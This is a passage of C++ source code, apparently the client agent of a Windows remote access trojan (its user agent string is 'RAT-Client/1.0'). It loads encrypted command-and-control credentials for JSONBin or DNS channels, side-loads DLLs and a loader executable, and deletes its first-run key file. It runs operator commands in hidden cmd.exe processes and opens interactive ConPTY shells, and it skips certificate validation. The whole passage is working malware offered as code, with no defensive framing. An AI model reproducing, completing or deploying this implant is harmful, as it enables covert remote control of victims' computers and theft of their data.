    std::string settingsFile = GetSettingsFilePath();
    PollSettings defaults = { 1800, 180, 3600, 60 };

    if (!FileExists(settingsFile)) {
        DebugLog("No settings.json found, using defaults");
        return defaults;
    }

    std::ifstream file(settingsFile);
    if (!file.is_open()) {
        DebugLog("Cannot open settings.json");
        return defaults;
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    SimpleJSON settings;
    settings.Parse(buffer.str());

    PollSettings result;
    std::string poll_str = settings.Get("poll_duration");
    std::string sleep_str = settings.Get("sleep_duration");
    std::string timeout_str = settings.Get("dns_timeout");
    std::string retries_str = settings.Get("dns_max_retries");

    result.poll_duration = poll_str.empty() ? defaults.poll_duration : std::stoi(poll_str);
    result.sleep_duration = sleep_str.empty() ? defaults.sleep_duration : std::stoi(sleep_str);
    result.dns_timeout = timeout_str.empty() ? defaults.dns_timeout : std::stoi(timeout_str);
    result.dns_max_retries = retries_str.empty() ? defaults.dns_max_retries : std::stoi(retries_str);

    DebugLog("Settings loaded: Poll=" + std::to_string(result.poll_duration) +
        "s, Sleep=" + std::to_string(result.sleep_duration) +
        "s, DNS Timeout=" + std::to_string(result.dns_timeout) + "s");

    return result;
}

bool SavePollSettings(const PollSettings& settings) {
    std::string modulesMainDir = GetBaseDir() + "\\modules\\main";
    CreateDirectoryA(modulesMainDir.c_str(), NULL);

    std::string settingsFile = GetSettingsFilePath();

    std::ofstream file(settingsFile);
    if (!file.is_open()) {
        DebugLog("ERROR: Cannot save settings.json");
        return false;
    }

    file << "{\n";
    file << "  \"poll_duration\": " << settings.poll_duration << ",\n";
    file << "  \"sleep_duration\": " << settings.sleep_duration << ",\n";
    file << "  \"dns_timeout\": " << settings.dns_timeout << ",\n";
    file << "  \"dns_max_retries\": " << settings.dns_max_retries << "\n";
    file << "}";

    file.close();

    DebugLog(" Settings saved to settings.json");
    return true;
}

std::string LoadMode() {
    std::string modeFile = GetModeFilePath();

    if (!FileExists(modeFile)) {
        CreateDirectoryA((GetBaseDir() + "\\modules\\main").c_str(), NULL);

        std::ofstream file(modeFile);
        if (file.is_open()) {
            file << "{\"mode\":\"jsonbin\"}";
            file.close();
        }
        return "jsonbin";
    }

    std::ifstream file(modeFile);
    if (!file.is_open()) return "jsonbin";

    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    SimpleJSON modeData;
    modeData.Parse(buffer.str());
    std::string mode = modeData.Get("mode");

    return mode.empty() ? "jsonbin" : mode;
}

bool SaveMode(const std::string& mode) {
    std::string modulesMainDir = GetBaseDir() + "\\modules\\main";
    std::string modeFile = modulesMainDir + "\\mode.json";

    CreateDirectoryA(modulesMainDir.c_str(), NULL);

    std::ofstream file(modeFile);
    if (!file.is_open()) {
        DebugLog("ERROR: Cannot save mode.json to modules\\main");
        return false;
    }

    file << "{\"mode\":\"" << mode << "\"}";
    file.close();

    DebugLog(" Mode saved to modules\\main\\mode.json: " + mode);
    if (mode == "jsonbin") {
        DebugLog(" DNS credentials cleared from mode.json");
        DebugLog(" Will load credentials from listener_config.enc");
    }
    return true;
}

bool SaveDNSConfigToMode(const std::string& config_json) {
    std::string modulesMainDir = GetBaseDir() + "\\modules\\main";
    std::string modeFile = modulesMainDir + "\\mode.json";

    DebugLog("=== SAVING DNS CONFIG TO MODE.JSON ===");
    DebugLog("Target file: " + modeFile);
    DebugLog("Raw config JSON: " + config_json);

    if (!CreateDirectoryA(modulesMainDir.c_str(), NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            DebugLog("ERROR: Failed to create modules\\main directory");
            return false;
        }
    }

    std::string unescaped = UnescapeJson(config_json);
    DebugLog("Unescaped config: " + unescaped);

    SimpleJSON dnsConfig;
    dnsConfig.Parse(unescaped);

    std::string server_ip = dnsConfig.Get("server_ip");
    if (server_ip.empty()) server_ip = dnsConfig.Get("dns_server_ip");

    std::string domain = dnsConfig.Get("domain");
    if (domain.empty()) domain = dnsConfig.Get("dns_domain");

    std::string port = dnsConfig.Get("port");
    if (port.empty()) port = dnsConfig.Get("dns_port");

    std::string encryption_key = dnsConfig.Get("encryption_key");
    if (encryption_key.empty()) encryption_key = dnsConfig.Get("dns_encryption_key");

    DebugLog("Parsed values:");
    DebugLog("  server_ip: " + server_ip);
    DebugLog("  domain: " + domain);
    DebugLog("  port: " + port);
    DebugLog("  encryption_key: " + encryption_key);

    if (server_ip.empty() || domain.empty() || port.empty() || encryption_key.empty()) {
        DebugLog("ERROR: Missing required DNS configuration fields");
        return false;
    }

    std::ofstream file(modeFile);
    if (!file.is_open()) {
        DebugLog("ERROR: Cannot open mode.json for writing - Error: " + std::to_string(GetLastError()));
        return false;
    }

    file << "{\n";
    file << "  \"mode\": \"dns\",\n";
    file << "  \"dns_server_ip\": \"" << server_ip << "\",\n";
    file << "  \"dns_domain\": \"" << domain << "\",\n";
    file << "  \"dns_port\": \"" << port << "\",\n";
    file << "  \"dns_encryption_key\": \"" << encryption_key << "\",\n";
    file << "}";

    file.flush();
    file.close();

    if (!FileExists(modeFile)) {
        DebugLog("ERROR: mode.json was not created");
        return false;
    }

    DebugLog(" DNS config written to mode.json");

    std::ifstream verifyFile(modeFile);
    if (verifyFile.is_open()) {
        std::stringstream buffer;
        buffer << verifyFile.rdbuf();
        DebugLog("Verification - mode.json contents:");
        DebugLog(buffer.str());
        verifyFile.close();
    }
    else {
        DebugLog("WARNING: Could not verify mode.json contents");
    }

    return true;
}

SimpleJSON LoadDNSConfigFromMode() {
    std::string modeFile = GetModeFilePath();
    SimpleJSON config;

    if (!FileExists(modeFile)) {
        DebugLog("mode.json not found");
        return config;
    }

    std::ifstream file(modeFile);
    if (!file.is_open()) {
        DebugLog("Cannot open mode.json");
        return config;
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    config.Parse(buffer.str());

    std::string mode = config.Get("mode");
    if (mode == "dns") {
        DebugLog("Loading DNS config from mode.json:");
        DebugLog("  Server IP: " + config.Get("dns_server_ip"));
        DebugLog("  Domain: " + config.Get("dns_domain"));
        DebugLog("  Port: " + config.Get("dns_port"));
    }

    return config;
}

bool UpdateJSONBinConfig(const std::string& newBinID, const std::string& newApiKey, const std::string& newUrl) {

    DebugLog("Updating JSONBin Configuration");

    DebugLog("  Input BIN_ID: " + newBinID);
    DebugLog("  Input API_KEY length: " + std::to_string(newApiKey.length()));
    DebugLog("  Input URL: " + newUrl);

    std::string keyDirName = GetKeyDirectoryName();
    if (keyDirName.empty()) {
        DebugLog("ERROR: No encryption key found");
        return false;
    }

    std::string encryptionKey = ReconstructKey(keyDirName);
    std::string encConfigPath = GetListenerConfigPath();

    SimpleJSON config;
    if (!LoadEncryptedConfig(config, encryptionKey)) {
        DebugLog("ERROR: Failed to decrypt existing config");
        return false;
    }

    DebugLog("Before update:");
    DebugLog("  Old BIN_ID: " + config.Get("BIN_ID"));
    DebugLog("  Old API_KEY length: " + std::to_string(config.Get("API_KEY").length()));
    DebugLog("  Old URL: " + config.Get("URL"));

    config.Set("BIN_ID", newBinID);
    config.Set("API_KEY", newApiKey);
    config.Set("URL", newUrl);

    DebugLog("After update (before save):");
    DebugLog("  New BIN_ID: " + config.Get("BIN_ID"));
    DebugLog("  New API_KEY length: " + std::to_string(config.Get("API_KEY").length()));
    DebugLog("  New URL: " + config.Get("URL"));

    if (!SaveEncryptedConfig(config, encryptionKey)) {
        DebugLog("ERROR: Failed to save updated config");
        return false;
    }

    SimpleJSON verifyConfig;
    if (LoadEncryptedConfig(verifyConfig, encryptionKey)) {
        DebugLog("Verification after save:");
        DebugLog("  Saved BIN_ID: " + verifyConfig.Get("BIN_ID"));
        DebugLog("  Saved API_KEY length: " + std::to_string(verifyConfig.Get("API_KEY").length()));
        DebugLog("  Saved URL: " + verifyConfig.Get("URL"));
    }

    DebugLog(" JSONBin credentials updated successfully");
    DebugLog("  New BIN_ID: " + newBinID);
    DebugLog("  New API_KEY: " + newApiKey.substr(0, 20) + "...");
    DebugLog("  New URL: " + newUrl);

    return true;
}

bool UpdateDNSConfig(const std::string& server_ip, const std::string& domain,
    const std::string& port, const std::string& encryption_key) {

    DebugLog("Updating DNS Configuration");


    SimpleJSON dnsConfig;
    dnsConfig.Set("mode", "dns");
    dnsConfig.Set("dns_server_ip", server_ip);
    dnsConfig.Set("dns_domain", domain);
    dnsConfig.Set("dns_port", port);
    dnsConfig.Set("dns_encryption_key", encryption_key);

    std::string dnsConfigJson = dnsConfig.ToString();

    if (!SaveDNSConfigToMode(dnsConfigJson)) {
        DebugLog("ERROR: Failed to save DNS config");
        return false;
    }

    DebugLog(" DNS credentials updated successfully");
    DebugLog("  Server IP: " + server_ip);
    DebugLog("  Domain: " + domain);
    DebugLog("  Port: " + port);

    return true;
}

bool InitializeConfig(SimpleJSON& config) {

    DebugLog("Initializing Configuration");


    std::string baseDir = GetBaseDir();
    std::string mainModDir = baseDir + "\\modules\\main\\";

    PollSettings pollSettings = LoadPollSettings();
    DebugLog("Poll Settings Loaded:");
    DebugLog("  Poll Duration: " + std::to_string(pollSettings.poll_duration) + "s");
    DebugLog("  Sleep Duration: " + std::to_string(pollSettings.sleep_duration) + "s");
    DebugLog("  DNS Timeout: " + std::to_string(pollSettings.dns_timeout) + "s");

    std::string cleanCPath = GetCleanCPath();
    bool cleanCExists = DirectoryExists(cleanCPath);

    if (cleanCExists) {
        DebugLog("clean.c directory exists - SKIPPING cvm.dll");
    }
    else {
        DebugLog("clean.c NOT found - LOADING cvm.dll from: " + mainModDir);
        std::string cvmPath = mainModDir + "cvm.dll";

        if (FileExists(cvmPath)) {
            if (LoadModule("cvm.dll")) {
                DebugLog("cvm.dll executed successfully");
                Sleep(1000);
            }
        }
        else {
            DebugLog("ERROR: cvm.dll missing at " + cvmPath);
        }
    }

    DebugLog("LOADING prep.dll from: " + mainModDir);
    std::string prepPath = mainModDir + "prep.dll";
    if (FileExists(prepPath)) {
        if (!LoadModule("prep.dll")) {
            DebugLog("WARNING: Failed to load prep.dll, but continuing...");
        }
        else {
            DebugLog("prep.dll loaded successfully");
        }
    }
    else {
        DebugLog("prep.dll not found; skipping optional load.");
    }

    std::string ldrPath = mainModDir + "ldr.exe";
    if (FileExists(ldrPath)) {
        DebugLog("Running ldr.exe from modules\\main");
        RunExecutable(ldrPath);
    }


    DebugLog("Loading mode.json to determine startup mode...");


    SimpleJSON modeConfig = LoadDNSConfigFromMode();
    std::string mode = modeConfig.Get("mode");

    if (mode.empty()) {
        DebugLog("No mode.json found - creating default JSONBin mode");
        SaveMode("jsonbin");
        mode = "jsonbin";
    }

    DebugLog("Loaded mode: " + mode);

    if (mode == "dns") {
        DebugLog("DNS mode detected - loading DNS credentials from mode.json");

        std::string dns_server_ip = modeConfig.Get("dns_server_ip");
        std::string dns_domain = modeConfig.Get("dns_domain");
        std::string dns_port = modeConfig.Get("dns_port");
        std::string dns_encryption_key = modeConfig.Get("dns_encryption_key");

        if (dns_server_ip.empty() || dns_domain.empty() || dns_port.empty() || dns_encryption_key.empty()) {
            DebugLog("ERROR: DNS mode selected but credentials missing in mode.json");
            DebugLog("Falling back to JSONBin mode");
            SaveMode("jsonbin");
            mode = "jsonbin";
        }
        else {
            config.Set("mode", "dns");
            config.Set("dns_server_ip", dns_server_ip);
            config.Set("dns_domain", dns_domain);
            config.Set("dns_port", dns_port);
            config.Set("dns_encryption_key", dns_encryption_key);
            config.Set("dns_timeout", std::to_string(pollSettings.dns_timeout));
            config.Set("dns_max_retries", std::to_string(pollSettings.dns_max_retries));

            DebugLog(" DNS credentials loaded from mode.json");
            DebugLog("  Server IP: " + dns_server_ip);
            DebugLog("  Domain: " + dns_domain);
            DebugLog("  Port: " + dns_port);

            return true;
        }
    }

    if (mode == "jsonbin") {
        DebugLog("JSONBin mode detected - loading listener_config.enc");

        std::string keyDirName = GetKeyDirectoryName();

        if (!keyDirName.empty()) {
            ENCRYPTION_KEY = ReconstructKey(keyDirName);

            if (LoadEncryptedConfig(config, ENCRYPTION_KEY)) {
                config.Set("mode", "jsonbin");
                config.Set("poll_duration", std::to_string(pollSettings.poll_duration));
                config.Set("sleep_duration", std::to_string(pollSettings.sleep_duration));

                std::string bin_id = config.Get("BIN_ID");
                std::string api_key = config.Get("API_KEY");
                std::string url = config.Get("URL");

                if (!bin_id.empty() && !api_key.empty() && !url.empty()) {
                    DebugLog(" Loaded encrypted config for JSONBin mode");
                    DebugLog("BIN_ID: " + bin_id);
                    DebugLog("URL: " + url);
                    DebugLog("Poll Duration: " + std::to_string(pollSettings.poll_duration) + "s");
                    DebugLog("Sleep Duration: " + std::to_string(pollSettings.sleep_duration) + "s");
                    return true;
                }
                else {
                    DebugLog(" Encrypted config incomplete - missing fields:");
                    if (bin_id.empty()) DebugLog("  - BIN_ID missing");
                    if (api_key.empty()) DebugLog("  - API_KEY missing");
                    if (url.empty()) DebugLog("  - URL missing");
                }
            }
            else {
                DebugLog(" Failed to load or decrypt listener_config.enc");
            }
        }
        else {
            DebugLog(" No encryption key directory found");
        }


        DebugLog("FIRST RUN DETECTED");
        DebugLog(" Attempting to load config_key.json...");


        SimpleJSON tempConfig;
        if (!LoadConfigKeyJSONAndDelete(tempConfig)) {
            DebugLog("ERROR: Failed to load config_key.json");
            return false;
        }

        config.Set("BIN_ID", tempConfig.Get("BIN_ID"));
        config.Set("API_KEY", tempConfig.Get("API_KEY"));
        config.Set("URL", tempConfig.Get("URL"));
        config.Set("mode", "jsonbin");
        config.Set("poll_duration", std::to_string(pollSettings.poll_duration));
        config.Set("sleep_duration", std::to_string(pollSettings.sleep_duration));


        DebugLog(" FIRST RUN COMPLETE");
        DebugLog(" config_key.json → listener_config.enc (ENCRYPTED)");
        DebugLog(" config_key.json DELETED");
        DebugLog(" Agent ready for operation");


        return true;
    }

    return false;
}

std::string HttpRequest(const std::string& url, const std::string& method,
    const std::string& apiKey, const std::string& data = "") {
    std::string hostname, path;
    bool useSSL = false;

    size_t protocolEnd = url.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = url.substr(0, protocolEnd);
        useSSL = (protocol == "https");

        size_t hostStart = protocolEnd + 3;
        size_t pathStart = url.find("/", hostStart);

        if (pathStart != std::string::npos) {
            hostname = url.substr(hostStart, pathStart - hostStart);
            path = url.substr(pathStart);
        }
        else {
            hostname = url.substr(hostStart);
            path = "/";
        }
    }

    HINTERNET hInternet = InternetOpenA("RAT-Client/1.0", INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0);
    if (!hInternet) return "";

    INTERNET_PORT port = useSSL ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    HINTERNET hConnect = InternetConnectA(hInternet, hostname.c_str(), port,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
    if (useSSL) {
        flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
            INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(),
        NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Content-Type: application/json\r\n";
    if (!apiKey.empty()) {
        headers += "X-Master-Key: " + apiKey + "\r\n";
    }

    BOOL result = FALSE;
    if (method == "PUT" && !data.empty()) {
        result = HttpSendRequestA(hRequest, headers.c_str(),
            static_cast<DWORD>(headers.length()),
            (LPVOID)data.c_str(),
            static_cast<DWORD>(data.length()));
    }
    else {
        result = HttpSendRequestA(hRequest, headers.c_str(),
            static_cast<DWORD>(headers.length()), NULL, 0);
    }

    if (!result) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[8192];
    DWORD bytesRead = 0;
    std::string response;

    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) &&
        bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

std::string GetPublicIP() {
    return HttpRequest("https://api.ipify.org", "GET", "", "");
}

std::string ExecuteShellCommand(const std::string& cmd);
std::string ExecutePowerShellScript(const std::string& psCmd);

std::string StripAnsiSequences(const std::string& input) {
    std::string output;
    output.reserve(input.length());

    for (size_t i = 0; i < input.length(); i++) {

        if (input[i] == '\x1B' && i + 1 < input.length() && input[i + 1] == '[') {

            size_t j = i + 2;
            while (j < input.length() &&
                (isdigit(input[j]) || input[j] == ';' || input[j] == '?' || input[j] == '=')) {
                j++;
            }
            if (j < input.length()) {
                j++;
            }
            i = j - 1;
            continue;
        }

        if (input[i] < 32 && input[i] != '\n' && input[i] != '\r' && input[i] != '\t') {
            continue;
        }

        output += input[i];
    }

    return output;
}

std::string StartPTYShell(const std::string& shellCmd = "cmd.exe") {

    if (!LoadConPTYFunctions()) {
        return "ERROR: ConPTY not available (requires Windows 10 1809 or newer)";
    }

    std::lock_guard<std::mutex> lock(g_ptyMutex);

    if (g_ptySession.active) {
        return "PTY shell already active. Use 'exit' to close it first.";
    }

    DebugLog("=== Starting ConPTY Shell ===");
    DebugLog("Shell command: " + shellCmd);

    HANDLE hPipeIn_Read, hPipeIn_Write;
    HANDLE hPipeOut_Read, hPipeOut_Write;

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hPipeIn_Read, &hPipeIn_Write, &sa, 0)) {
        return "ERROR: Failed to create input pipe";
    }
    if (!CreatePipe(&hPipeOut_Read, &hPipeOut_Write, &sa, 0)) {
        CloseHandle(hPipeIn_Read);
        CloseHandle(hPipeIn_Write);
        return "ERROR: Failed to create output pipe";
    }

    HPCON hpc = nullptr;
    COORD consoleSize = { 120, 30 };

    HRESULT hr = CreatePseudoConsole(
        consoleSize,
        hPipeIn_Read,
        hPipeOut_Write,
        0,
        &hpc
    );

    if (FAILED(hr)) {
        CloseHandle(hPipeIn_Read);
        CloseHandle(hPipeIn_Write);
        CloseHandle(hPipeOut_Read);
        CloseHandle(hPipeOut_Write);
        return "ERROR: CreatePseudoConsole failed (requires Windows 10 1809+)";
    }

    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);

    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrListSize);

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize)) {
        free(attrList);
        ClosePseudoConsole(hpc);
        CloseHandle(hPipeIn_Read);
        CloseHandle(hPipeIn_Write);
        CloseHandle(hPipeOut_Read);
        CloseHandle(hPipeOut_Write);
        return "ERROR: Failed to initialize proc attributes";
    }

    if (!UpdateProcThreadAttribute(
        attrList, 0,
        PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
        hpc, sizeof(hpc), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        free(attrList);
        ClosePseudoConsole(hpc);
        CloseHandle(hPipeIn_Read);
        CloseHandle(hPipeIn_Write);
        CloseHandle(hPipeOut_Read);
        CloseHandle(hPipeOut_Write);
        return "ERROR: Failed to attach ConPTY";
    }

    STARTUPINFOEXW si = { sizeof(si) };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attrList;

    PROCESS_INFORMATION pi = { 0 };

    std::wstring wShellCmd(shellCmd.begin(), shellCmd.end());
    std::vector<wchar_t> cmdBuffer(wShellCmd.begin(), wShellCmd.end());
    cmdBuffer.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdBuffer.data(),
        NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo,
        &pi
    );

    DeleteProcThreadAttributeList(attrList);
    free(attrList);

    CloseHandle(hPipeIn_Read);
    CloseHandle(hPipeOut_Write);

    if (!success) {
        ClosePseudoConsole(hpc);
        CloseHandle(hPipeIn_Write);
        CloseHandle(hPipeOut_Read);
        return "ERROR: Failed to create process";
    }

    g_ptySession.hpc = hpc;
    g_ptySession.process = pi.hProcess;
    g_ptySession.input_pipe = hPipeIn_Write;
    g_ptySession.output_pipe = hPipeOut_Read;
    g_ptySession.shell_type = shellCmd;
    g_ptySession.active = true;

    CloseHandle(pi.hThread);

    Sleep(500);
    std::string initialOutput;
    char buffer[8192];
    DWORD bytesRead, bytesAvail;

    if (PeekNamedPipe(hPipeOut_Read, nullptr, 0, nullptr, &bytesAvail, nullptr) && bytesAvail > 0) {
        if (ReadFile(hPipeOut_Read, buffer, (std::min)(bytesAvail, (DWORD)(sizeof(buffer) - 1)), &bytesRead, nullptr)) {
            buffer[bytesRead] = '\0';
            initialOutput = std::string(buffer, bytesRead);
        }
    }

    DebugLog(" ConPTY shell started (PID: " + std::to_string(pi.dwProcessId) + ")");

    return std::string("=== PTY SHELL STARTED ===\n") +
        "Shell: " + shellCmd + "\n" +
        "PID: " + std::to_string(pi.dwProcessId) + "\n" +
        "Type 'exit' to close\n" +
        "=========================\n" + initialOutput;
}

void ClosePTYShell() {
    std::lock_guard<std::mutex> lock(g_ptyMutex);

    if (!g_ptySession.active) return;

    DebugLog("Closing PTY shell...");

    if (g_ptySession.process) {
        TerminateProcess(g_ptySession.process, 0);
        CloseHandle(g_ptySession.process);
    }
    if (g_ptySession.input_pipe) CloseHandle(g_ptySession.input_pipe);
    if (g_ptySession.output_pipe) CloseHandle(g_ptySession.output_pipe);
    if (g_ptySession.hpc) ClosePseudoConsole(g_ptySession.hpc);

    g_ptySession = { nullptr, nullptr, nullptr, nullptr, "", false };
    DebugLog(" PTY shell closed");
}

std::string ExecuteCommand(const std::string& cmd) {
    DebugLog("Executing: " + cmd);

    if (g_ptySession.active) {
        if (cmd == "exit" || cmd == "quit") {
            ClosePTYShell();
            return "--- PTY SESSION CLOSED: Returning to standard logs ---";
        }
        return SendInteractiveInput(cmd);
    }

    if (cmd.substr(0, 3) == "cd ") {
        std::string path = cmd.substr(3);
        if (!path.empty() && path.front() == '"' && path.back() == '"') {
            path = path.substr(1, path.length() - 2);
        }

        if (SetCurrentDirectoryA(path.c_str())) {
            char buffer[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, buffer);
            g_currentDir = buffer;
            return "Changed directory to: " + g_currentDir;
        }
        return "Directory not found: " + path;
    }

    for (int i = 0; INTERACTIVE_CMDS[i] != nullptr; i++) {
        if (cmd == INTERACTIVE_CMDS[i]) {
            std::string shellName = cmd;
            if (cmd == "cmd") shellName = "cmd.exe";
            if (cmd == "powershell") shellName = "powershell.exe";
            return StartPTYShell(shellName);
        }
    }

    std::string lowerCmd = cmd;
    std::transform(lowerCmd.begin(), lowerCmd.end(), lowerCmd.begin(),
        [](unsigned char c) { return std::tolower(c); });

    bool needsTemporaryPTY = (
        lowerCmd.find("python") == 0 ||
        lowerCmd.find("python.exe") == 0 ||
        lowerCmd.find("python3") == 0 ||
        lowerCmd.find("node") == 0 ||
        lowerCmd.find("java ") == 0 ||
        lowerCmd.find("npm ") == 0 ||
        lowerCmd.find("dotnet ") == 0 ||
        lowerCmd.find("ruby ") == 0
        );

    if (needsTemporaryPTY) {
        DebugLog("Command requires temporary PTY for output capture");

        std::string initResult = StartPTYShell("cmd.exe");
        if (initResult.find("ERROR") != std::string::npos) {
            return "Failed to initialize PTY: " + initResult;
        }

        std::string output = SendInteractiveInput(cmd);

        ClosePTYShell();

        return output;
    }

    HANDLE hStdoutRead, hStdoutWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0);
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    std::string cmdLine = "cmd.exe /c " + cmd;
    char* cmdLineBuffer = new char[cmdLine.length() + 1];
    strcpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());

    std::string result;
    if (CreateProcessA(NULL, cmdLineBuffer, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
        g_currentDir.c_str(), &si, &pi)) {
        CloseHandle(hStdoutWrite);

        DWORD startTime = GetTickCount();
        DWORD timeout = 60000;
        char buffer[8192];
        DWORD bytesRead;
        bool processRunning = true;

        while (processRunning) {

            DWORD exitCode;
            if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                processRunning = false;
            }

            DWORD bytesAvail = 0;
            if (PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
                DWORD toRead = (bytesAvail < sizeof(buffer) - 1) ? bytesAvail : sizeof(buffer) - 1;
                if (ReadFile(hStdoutRead, buffer, toRead, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    result += buffer;
                }
            }

            if (GetTickCount() - startTime > timeout) {
                DebugLog("Command timeout - terminating process");
                TerminateProcess(pi.hProcess, 1);
                result += "\n[TIMEOUT: Command exceeded " + std::to_string(timeout / 1000) + " seconds]";
                break;
            }

            if (processRunning) {
                Sleep(100);
            }
        }

        DWORD bytesAvail = 0;
        while (PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
            DWORD toRead = (bytesAvail < sizeof(buffer) - 1) ? bytesAvail : sizeof(buffer) - 1;
            if (ReadFile(hStdoutRead, buffer, toRead, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            else {
                break;
            }
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        result = "Failed to execute command: " + std::to_string(GetLastError());
    }

    delete[] cmdLineBuffer;
    CloseHandle(hStdoutRead);

    return result.empty() ? "Command executed (no output)" : result;
}

std::string SendInteractiveInput(const std::string& input) {
    if (!g_ptySession.active) return "No active PTY session";

    DWORD written;
    std::string cmd = input + "\r";
    std::string final_buffer = "";
    char read_chunk[16384];
    DWORD bytesAvail, bytesRead;

    DebugLog("Clearing stale pipe data...");
    while (PeekNamedPipe(g_ptySession.output_pipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
        if (ReadFile(g_ptySession.output_pipe, read_chunk, sizeof(read_chunk) - 1, &bytesRead, NULL)) {
            DebugLog("Discarded " + std::to_string(bytesRead) + " stale bytes");
        }
    }

    DebugLog("Writing command: " + input);
    if (!WriteFile(g_ptySession.input_pipe, cmd.c_str(), (DWORD)cmd.length(), &written, NULL)) {
        return "ERROR: Failed to write to PTY";
    }
    FlushFileBuffers(g_ptySession.input_pipe);

    bool is_diskpart = (g_ptySession.shell_type.find("diskpart") != std::string::npos);
    int initial_wait = is_diskpart ? 1500 : 300;

    DebugLog("Waiting " + std::to_string(initial_wait) + "ms for command processing...");
    Sleep(initial_wait);

    DebugLog("Starting read loop...");

    int iterations_without_data = 0;
    int max_idle_iterations = is_diskpart ? 80 : 50;
    size_t last_buffer_size = 0;
    int consecutive_size_matches = 0;
    int required_stability = is_diskpart ? 30 : 20;

    while (true) {
        bool read_something = false;

        while (PeekNamedPipe(g_ptySession.output_pipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
            DWORD to_read = (std::min)(bytesAvail, (DWORD)(sizeof(read_chunk) - 1));
            if (ReadFile(g_ptySession.output_pipe, read_chunk, to_read, &bytesRead, NULL)) {
                if (bytesRead > 0) {
                    read_chunk[bytesRead] = '\0';
                    final_buffer += std::string(read_chunk, bytesRead);
                    read_something = true;
                    iterations_without_data = 0;
                }
            }
        }

        if (!read_something) {
            iterations_without_data++;

            if (final_buffer.length() == last_buffer_size) {
                consecutive_size_matches++;
            }
            else {
                consecutive_size_matches = 0;
                last_buffer_size = final_buffer.length();
            }

            if (consecutive_size_matches >= required_stability && final_buffer.length() > 0) {
                std::string tail = final_buffer.length() > 500 ?
                    final_buffer.substr(final_buffer.length() - 500) : final_buffer;

                bool has_prompt = (
                    tail.find("DISKPART>") != std::string::npos ||
                    tail.find("PS ") != std::string::npos ||
                    tail.find("PS>") != std::string::npos ||
                    (tail.find(":\\") != std::string::npos && tail.find(">") != std::string::npos) ||
                    tail.find("ftp>") != std::string::npos ||
                    tail.find("telnet>") != std::string::npos
                    );

                if (has_prompt) {
                    DebugLog("Prompt detected. Command complete.");
                    break;
                }
            }

            if (iterations_without_data >= max_idle_iterations) {
                DebugLog("Timeout - no new data.");
                break;
            }
        }

        Sleep(100);
    }

    DebugLog("Read complete. Buffer size: " + std::to_string(final_buffer.length()));

    final_buffer = StripAnsiSequences(final_buffer);

    std::string patterns[] = {
        input + "\r\n",
        input + "\n",
        input + "\r"
    };

    for (const auto& pattern : patterns) {
        if (final_buffer.find(pattern) == 0) {
            final_buffer = final_buffer.substr(pattern.length());
            DebugLog("Removed echo pattern: " + pattern);
            break;
        }
    }

    size_t start = final_buffer.find_first_not_of(" \t\r\n");
    size_t end = final_buffer.find_last_not_of(" \t\r\n");

    if (start != std::string::npos && end != std::string::npos) {
        final_buffer = final_buffer.substr(start, end - start + 1);
    }

    DebugLog("Final output size: " + std::to_string(final_buffer.length()) + " bytes");

